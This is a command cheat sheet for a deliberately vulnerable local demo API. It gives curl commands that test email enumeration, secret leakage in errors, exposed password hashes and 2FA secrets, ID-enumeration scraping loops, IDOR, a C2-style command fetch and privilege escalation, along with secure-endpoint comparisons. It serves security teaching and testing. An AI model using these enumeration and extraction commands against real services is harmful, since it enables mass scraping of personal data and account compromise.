# Quick Commands Reference

All commands to test vulnerabilities in one place. See [VULNERABILITY_GUIDE.md](./VULNERABILITY_GUIDE.md) for detailed explanations.

## Setup

```bash
# Start server
cd backend-demo
npm install
npm start
```

## Get Authentication Tokens

```bash
# Admin token
ADMIN_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"any"}' | jq -r '.token')

# User token
USER_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@example.com","password":"any"}' | jq -r '.token')

# Partner token
PARTNER_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"diana@example.com","password":"any"}' | jq -r '.token')

# Service account tokens
SVC_TOKEN_SIGN="svc_token_sign_prod_12345"
SVC_TOKEN_GRAPH="svc_token_graph_api_67890"
```

---

## 1. Trello-style Email Enumeration

**Why Bad**: Leaks user existence, enables targeted attacks

```bash
# Valid email (returns user data)
curl http://localhost:3000/api/members/alice@example.com

# Invalid email (different response = enumeration risk)
curl http://localhost:3000/api/members/fake@example.com
```

---

## 2. TTIBI-style Password in Error Logs

**Why Bad**: Secrets exposed in error responses

```bash
# Get token first
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"any"}' | jq -r '.token')

# Trigger error (missing fields)
curl -X POST http://localhost:3000/api/send-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to":"test@example.com"}'

# Decode Base64 password from response
echo "c210cF9wYXNzd29yZF9zZWNyZXRfMTIzNDU=" | base64 -d
```

---

## 3. Spoutible-style Public API with Full User Object

**Why Bad**: Complete account compromise - passwords, 2FA, reset tokens exposed

```bash
# No auth required - returns ALL secrets
curl "http://localhost:3000/api/user_profile_box?username=alice"

# Extract secrets
curl -s "http://localhost:3000/api/user_profile_box?username=alice" | \
  jq '{email, password_hash, two_factor_secret, backup_codes, reset_token}'
```

---

## 4. GitHub-style Secrets in Config Files

**Why Bad**: Hardcoded secrets in version control, permanent exposure

```bash
# Check for secrets
cat .env
cat config/secrets.js
cat config/database.json

# Search for common secret patterns
grep -r "AWS_SECRET" .
grep -r "password.*=" config/
```

---

## 5. PandaBuy-style Mass Scraping

**Why Bad**: No auth, enumerable IDs, full PII, no rate limiting

```bash
# Enumerate orders (weak auth)
curl http://localhost:3000/api/orders/1
curl http://localhost:3000/api/orders/2
curl http://localhost:3000/api/orders/3

# Enumerate customers (NO AUTH)
curl http://localhost:3000/api/customer/1
curl http://localhost:3000/api/customer/2

# Automated enumeration
for i in {1..100}; do
  curl -s http://localhost:3000/api/orders/$i | jq '.customer.email'
done
```

---

## 6. Microsoft Graph-style Cloud API Patterns

**Why Bad**: Service accounts used for C2, high privilege abuse

```bash
# Suspicious C2 pattern
curl http://localhost:3000/api/service/graph/drive/root/c2/commands.txt \
  -H "Authorization: Bearer $SVC_TOKEN_GRAPH"

# Decode Base64 content
curl -s http://localhost:3000/api/service/graph/drive/root/c2/commands.txt \
  -H "Authorization: Bearer $SVC_TOKEN_GRAPH" | \
  jq -r '.content' | base64 -d
```

---

## 7. Dropbox Sign-style Overprivileged Service Accounts

**Why Bad**: Service accounts have access to ALL customer data

```bash
# Service account accesses all customers
curl http://localhost:3000/api/service/customers \
  -H "Authorization: Bearer $SVC_TOKEN_SIGN"

# Extract sensitive data
curl -s http://localhost:3000/api/service/customers \
  -H "Authorization: Bearer $SVC_TOKEN_SIGN" | \
  jq '.customers[0] | {email, password_hash, two_factor_secret}'
```

---

## 8. Dell-style Partner Portal with No Rate Limiting

**Why Bad**: Enumerable service tags, full PII, no rate limiting

```bash
# Enumerate service tags
curl http://localhost:3000/api/partner/orders/ABC1234 \
  -H "Authorization: Bearer $PARTNER_TOKEN"

curl http://localhost:3000/api/partner/orders/ABC1235 \
  -H "Authorization: Bearer $PARTNER_TOKEN"

# Rapid enumeration (no rate limiting)
for i in {0..99}; do
  curl -s http://localhost:3000/api/partner/orders/ABC12$i \
    -H "Authorization: Bearer $PARTNER_TOKEN" | \
    jq '.customer.email'
done
```

---

## 9. IDOR (Insecure Direct Object Reference)

**Why Bad**: Users can access other users' private data

```bash
# Bob (ID=2) accesses Alice's data (ID=1)
curl http://localhost:3000/api/users/1 \
  -H "Authorization: Bearer $USER_TOKEN"

# Bob accesses Charlie's data (ID=3)
curl http://localhost:3000/api/users/3 \
  -H "Authorization: Bearer $USER_TOKEN"
```

---

## 10. Missing Authentication on Admin Endpoints

**Why Bad**: Regular users gain admin access (privilege escalation)

```bash
# Regular user accesses admin endpoint
curl http://localhost:3000/api/admin/users/vulnerable \
  -H "Authorization: Bearer $USER_TOKEN"

# Should require admin role but doesn't
curl -s http://localhost:3000/api/admin/users/vulnerable \
  -H "Authorization: Bearer $USER_TOKEN" | \
  jq '.users[] | {email, phone, address}'
```

---

## Comparison: Vulnerable vs Secure Endpoints

### Email Enumeration
```bash
# Vulnerable (no auth, different responses)
curl http://localhost:3000/api/members/alice@example.com

# Secure (requires auth, consistent responses)
curl http://localhost:3000/api/members/alice@example.com/secure \
  -H "Authorization: Bearer $TOKEN"
```

### User Profile
```bash
# Vulnerable (returns all secrets)
curl "http://localhost:3000/api/user_profile_box?username=alice"

# Secure (minimal public info)
curl "http://localhost:3000/api/user_profile_box/secure?username=alice"
```

### Orders
```bash
# Vulnerable (no IDOR check)
curl http://localhost:3000/api/orders/1

# Secure (checks ownership)
curl http://localhost:3000/api/orders/1/secure \
  -H "Authorization: Bearer $TOKEN"
```

### Email Errors
```bash
# Vulnerable (secrets in errors)
curl -X POST http://localhost:3000/api/send-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to":"test@example.com"}'

# Secure (generic errors)
curl -X POST http://localhost:3000/api/send-email/secure \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to":"test@example.com","subject":"Test","body":"Test"}'
```

---

## Automated Testing Script

```bash
#!/bin/bash
# Run all vulnerability tests

echo "=== Vulnerability Test Suite ==="

echo "1. Email Enumeration"
curl -s http://localhost:3000/api/members/alice@example.com | jq -r '.email // "NOT FOUND"'
curl -s http://localhost:3000/api/members/fake@example.com | jq -r '.error // "FOUND"'

echo "2. Public User Object"
curl -s "http://localhost:3000/api/user_profile_box?username=alice" | \
  jq 'has("password_hash")' # Should be true (vulnerable)

echo "3. Mass Scraping"
for i in {1..5}; do
  curl -s http://localhost:3000/api/orders/$i | jq -r '.customer.email'
done

echo "4. IDOR"
USER_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@example.com","password":"any"}' | jq -r '.token')
curl -s http://localhost:3000/api/users/1 \
  -H "Authorization: Bearer $USER_TOKEN" | jq -r '.email'

echo "=== Tests Complete ==="
```

---

## Quick Health Check

```bash
# Server health
curl http://localhost:3000/health

# Root endpoint (lists all endpoints)
curl http://localhost:3000/
```

---

## Tips

1. **Use `jq` for JSON parsing**: `curl ... | jq '.field'`
2. **Save tokens**: `TOKEN=$(curl ... | jq -r '.token')`
3. **Test enumeration**: Use loops to test ID enumeration
4. **Compare responses**: Test valid vs invalid inputs
5. **Check status codes**: `curl -v` shows HTTP status codes
6. **Decode Base64**: `echo "BASE64" | base64 -d`

---

For detailed explanations, see [VULNERABILITY_GUIDE.md](./VULNERABILITY_GUIDE.md)

